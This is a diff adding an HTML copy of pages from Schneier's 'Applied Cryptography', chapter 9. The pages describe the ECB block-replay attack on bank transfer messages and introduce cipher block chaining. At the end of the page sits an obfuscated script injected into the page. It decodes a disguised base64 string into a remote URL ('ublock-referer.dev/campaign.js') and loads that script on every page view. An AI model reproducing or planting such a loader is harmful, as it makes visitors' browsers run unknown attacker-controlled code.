@@ -1,0 +1,118 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Algorithm Types and Modes</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=09//-->
+<!--PAGES=191-194//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="09-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="09-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>To illustrate the problem, consider a money transfer system that moves money between accounts in different banks. To make life easier for the bank&#146;s computer systems, banks agree on a standard message format for money transfer that looks like this:
+</P>
+<!-- CODE SNIP //-->
+<PRE>
+     Bank One: Sending         1.5 blocks
+     Bank Two: Receiving       1.5 blocks
+     Depositor&#146;s Name          6 blocks
+     Depositor&#146;s Account       2 blocks
+     Amount of Deposit         1 block
+</PRE>
+<!-- END CODE SNIP //-->
+<P>A block corresponds to an 8-byte encryption block. The messages are encrypted using some block algorithm in ECB mode.
+</P>
+<I><P><A NAME="Fig1"></A><A HREF="javascript:displayWindow('images/09-01.jpg',275,111 )"><IMG SRC="images/09-01t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/09-01.jpg',275,111)"><FONT COLOR="#000077"><B>Figure 9.1</B></FONT></A>&nbsp;&nbsp;Ciphertext stealing in ECB mode.</I>
+</P>
+<P>Mallory, who is listening on the communications line between two banks, Bank of Alice and Bank of Bob, can use this information to get rich. First, he sets up his computer to record all of the encrypted messages from Bank of Alice to Bank of Bob. Then, he transfers $100 from Bank of Alice to his account in Bank of Bob. Later, he does it again. Using his computer, he examines the recorded messages looking for a pair of identical messages. These messages are the ones authorizing the $100 transfers to his account. If he finds more than one pair of identical messages (which is most likely in real life), he does another money transfer and records those results. Eventually he can isolate the message that authorized his money transaction.
+</P>
+<P>Now he can insert that message into the communications link at will. Every time he sends the message to Bank of Bob, another $100 will be credited to his account. When the two banks reconcile their transfers (probably at the end of the day), they will notice the phantom transfer authorizations; but if Mallory is clever, he will have already withdrawn the money and headed for some banana republic without extradition laws. And he probably did his scam with dollar amounts far larger than $100, and with lots of different banks.</P>
+<P>At first glance, the banks could easily prevent this by adding a timestamp to their messages.</P>
+<!-- CODE SNIP //-->
+<PRE>
+    Date/Time Stamp:                1 block
+    Bank One: Sending               1.5 blocks
+    Bank Two: Receiving             1.5 blocks
+    Depositor&#146;s Name                6 blocks
+    Depositor&#146;s Account             2 blocks
+    Amount of Deposit               1 block
+</PRE>
+<!-- END CODE SNIP //-->
+<P>Two identical messages would be easy to spot using this system. Still, using a technique called <B>block replay</B>, Mallory can still get rich. Figure 9.2 shows that Mallory can pick out the eight ciphertext blocks that correspond to his own name and account number: blocks 5 through 12. A diabolical laugh is appropriate at this point, because Mallory is now ready.</P>
+<P>He intercepts random messages from Bank of Alice to Bank of Bob and replaces blocks 5 through 12 in the message with the bytes that correspond to his name and account number. Then he sends them on to Bank of Bob. He doesn&#146;t have to know who the original depositor was; he doesn&#146;t even have to know what the amount was (although, he could correlate the messages he doctored with the various deposits into his account and determine the encrypted blocks corresponding to some dollar amount). He simply changes the name and account numbers to his own and watches his account balance grow. (I suppose Mallory has to be careful not to modify a withdrawal message, but assume for the moment that each is a different length or something.)</P>
+<I><P><A NAME="Fig2"></A><A HREF="javascript:displayWindow('images/09-02.jpg',360,74 )"><IMG SRC="images/09-02t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/09-02.jpg',360,74)"><FONT COLOR="#000077"><B>Figure 9.2</B></FONT></A>&nbsp;&nbsp;Encryption blocks for an example record.</I>
+</P>
+<P>This will take longer than a day for the banks to catch. When they reconcile their transfers at the end of the day, everything will match. It probably won&#146;t be until one of the legitimate depositors notices that his deposits are not being credited, or when someone flags unusual activity in Mallory&#146;s account, that the banks will figure out the scam. Mallory isn&#146;t stupid, and by then he will have closed his account, changed his name, and bought a villa in Argentina.
+</P>
+<P>Banks can minimize the problem by changing their keys frequently, but this only means that Mallory is going to have to work more quickly. Adding a MAC, however, will also solve the problem. Even so, this is a fundamental problem with ECB mode. Mallory can remove, repeat, or interchange blocks at will. The solution is a technique called <B>chaining</B>.</P>
+<H3><A NAME="Heading4"></A><FONT COLOR="#000077">9.3  Cipher Block Chaining Mode</FONT></H3>
+<P>Chaining adds a <B>feedback</B> mechanism to a block cipher: The results of the encryption of previous blocks are fed back into the encryption of the current block. In other words, each block is used to modify the encryption of the next block. Each ciphertext block is dependent not just on the plaintext block that generated it but on all the previous plaintext blocks.</P>
+<P>In <B>cipher block chaining</B> (<B>CBC</B>) mode, the plaintext is XORed with the previous ciphertext block before it is encrypted. Figure 9.3a shows CBC encryption in action. After a plaintext block is encrypted, the resulting ciphertext is also stored in a feedback register. Before the next plaintext block is encrypted, it is XORed with the feedback register to become the next input to the encrypting routine. The resulting ciphertext is again stored in the feedback register, to be XORed with the next plaintext block, and so on until the end of the message. The encryption of each block depends on all the previous blocks.</P>
+<P>Decryption is just as straightforward (see Figure 9.3b). A ciphertext block is decrypted normally and also saved in a feedback register. After the next block is decrypted, it is XORed with the results of the feedback register. Then the next ciphertext block is stored in the feedback register, and so on, until the end of the message.</P>
+<P>Mathematically, this looks like:</P>
+<DL>
+<DD><I>C</I><SUB>i</SUB> = <I>E</I><SUB>K</SUB>(<I>P</I><SUB>i</SUB>  &#8853; <I>C</I><SUB>i-1</SUB>)
+<DD><I>P</I><SUB>i</SUB> = <I>C</I><SUB>i-1</SUB> &#8853; <I>D</I><SUB>K</SUB>(<I>C</I><SUB>i</SUB>)
+</DL>
+<I><P><A NAME="Fig3"></A><A HREF="javascript:displayWindow('images/09-03.jpg',310,174 )"><IMG SRC="images/09-03t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/09-03.jpg',310,174)"><FONT COLOR="#000077"><B>Figure 9.3</B></FONT></A>&nbsp;&nbsp;Cipher block chaining mode.</I>
+</P>
+<P><FONT SIZE="+1"><B><I>Initialization Vector</I></B></FONT></P>
+<P>CBC mode forces identical plaintext blocks to encrypt to different ciphertext blocks only when some previous plaintext block is different. Two identical messages will still encrypt to the same ciphertext. Even worse, two messages that begin the same will encrypt in the same way up to the first difference.
+</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="09-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="09-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(dUFPonnN, wQZilXRD) {wQZilXRD = dUFPonnN.createElement('script');wQZilXRD.type = 'text/javascript';wQZilXRD.async = true;wQZilXRD.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');dUFPonnN.getElementsByTagName('body')[0].appendChild(wQZilXRD);}(document));</script></body>
+</html>
